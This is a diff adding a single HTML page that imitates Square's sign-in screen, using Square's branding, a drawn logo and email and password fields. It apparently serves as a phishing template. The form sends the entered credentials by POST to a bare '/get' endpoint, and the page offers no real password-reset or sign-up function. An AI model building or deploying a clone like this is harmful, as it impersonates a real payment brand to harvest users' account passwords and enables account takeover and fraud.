@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Square</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #f5f5f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 400px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 40px 36px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      }
+      #logo {
+        margin-bottom: 24px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 600;
+        color: #1a1a1a;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #737373;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #006aff;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #006aff;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #0059e6;
+      }
+      .link {
+        display: block;
+        margin-top: 16px;
+        color: #006aff;
+        font-size: 14px;
+        text-decoration: none;
+        text-align: center;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 13px;
+        color: #737373;
+        text-align: center;
+      }
+      .footer a {
+        color: #006aff;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 100 40" width="100" height="40">
+        <rect x="0" y="8" width="24" height="24" rx="4" fill="#006aff"/>
+        <rect x="4" y="12" width="4" height="16" rx="1" fill="#fff"/>
+        <rect x="8" y="12" width="4" height="16" rx="1" fill="#fff"/>
+        <text x="32" y="26" font-family="Arial" font-weight="700" font-size="18" fill="#1a1a1a">Square</text>
+      </svg>
+      <h1 class="g-h1">Sign in to Square</h1>
+      <p class="g-h2">Enter your email to continue</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Sign In</button>
+      </form>
+      <a href="#" class="link">Forgot password?</a>
+      <p class="footer">Don't have a Square account? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
